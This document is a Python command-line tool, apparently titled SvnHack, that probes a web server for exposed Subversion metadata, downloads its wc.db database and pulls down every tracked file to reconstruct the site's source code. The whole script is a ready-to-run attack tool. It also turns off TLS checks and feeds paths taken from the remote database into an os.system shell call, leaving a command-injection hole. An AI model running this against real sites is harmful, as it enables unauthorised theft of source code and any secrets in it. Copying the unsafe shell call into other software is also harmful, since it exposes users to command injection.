#!/usr/bin/env python3
#coding:utf-8

import os
import sys
import requests
import sqlite3
import urllib
import argparse
from urllib.request import urlretrieve


class SvnHack(object):
    def __init__(self, url):
        self.url = url + ('' if url.endswith('/') else '/') 
        self.rootPath = "./" or os.path.split(__file__)
        self.__setup()
        self.__mkdirSvn()

      
    def __setup(self):
        self.entriesUrl = urllib.parse.urljoin(self.url, "entries") 
        self.wcdbUrl = urllib.parse.urljoin(self.url, "wc.db") 
        self.svnSiteDirName = os.path.join(self.rootPath, urllib.parse.urlsplit(self.url).netloc)
        self.wcdbPath = os.path.join(self.svnSiteDirName, "wc.db")

    def __mkdirSvn(self):
        if not os.path.exists(self.svnSiteDirName):
            os.mkdir(os.path.join(self.rootPath, self.svnSiteDirName))
        
        
    def checkSvnEntries(self):
        try:
            response = requests.get(url = self.entriesUrl, verify = False)
            assert [200, 403].count(response.status_code) > 0
            print('[+] /.svn/entries exists -> len: {}'.format(response.headers['content-length']))
        except:
            print('404') 
            
    def checkSvnWcdb(self):
        try:
            response = requests.get(url = self.wcdbUrl, verify = False)
            assert [200, 403].count(response.status_code) > 0
            print('[+] /.svn/wc.db exists -> len: {}'.format(response.headers['content-length']))
        except:
            pass

    def getWcdb(self):
        try:
            if not os.path.exists(self.wcdbPath):
                print('[+] Downloading wc.db')
                urlretrieve(self.wcdbUrl, self.wcdbPath)
                print('[+] Downloaded') 
        except:
            print("Download 'wc.db' Failed")

    def readWcdb(self):
        if not os.path.exists(self.wcdbPath):
            self.getWcdb()
        conn = sqlite3.connect(self.wcdbPath)
        cur = conn.cursor()
        sqlcmd = "SELECT local_relpath, checksum FROM NODES where checksum <> ''"
        rows = cur.execute(sqlcmd)
        for urlPath, checksum in rows:
            yield urlPath, checksum 
        conn.close()
        

    def mkdirSitesDir(self, path):
        if os.path.exists(path):
             return
        os.system('mkdir -p "{}"'.format(path))
        
    def downloadSvnData(self):
        for path, checksum in self.readWcdb():
            self.mkdirSitesDir(os.path.join(self.svnSiteDirName, os.path.split(path)[0]))
            pristineSubdir = checksum[6:8]
            pristineFileName = checksum[6:]
            filePath = "pristine/" + pristineSubdir + "/" + pristineFileName + ".svn-base"
            try:
                if os.path.exists(os.path.join(self.svnSiteDirName, path)):
                    continue
                print('[+] Download -> {}'.format(urllib.parse.urljoin(self.url, filePath)))
                urlretrieve(urllib.parse.urljoin(self.url, filePath), os.path.join(self.svnSiteDirName, path))
                print('[+] Downloaded')
            except KeyboardInterrupt:
                sys.exit(1) 
            except:
                pass
        
def cmdParser():
    argParser = argparse.ArgumentParser()
    argParser.add_argument('-u', '--url', required = True, dest = 'targetUrl', help = 'Special svn target url')
    argParser.add_argument('--wcdb', action = 'store_true', help = 'Check wc.db file exists or not')
    argParser.add_argument('--entries', action = 'store_true', help = 'Check entries file exists or not')
    argParser.add_argument('--download', action = 'store_true', help = 'Download .svn data')
    args = argParser.parse_args()
    return args
    
        
def main():
    args = cmdParser()
    svnhack = SvnHack(args.targetUrl)

    if args.entries:
        svnhack.checkSvnEntries()
    elif args.wcdb:
        svnhack.checkSvnWcdb()
    elif args.download:
        svnhack.downloadSvnData()
    else:
        os.system("python3 {} -h".format(__file__))


if __name__ == "__main__":
    main()
    
        
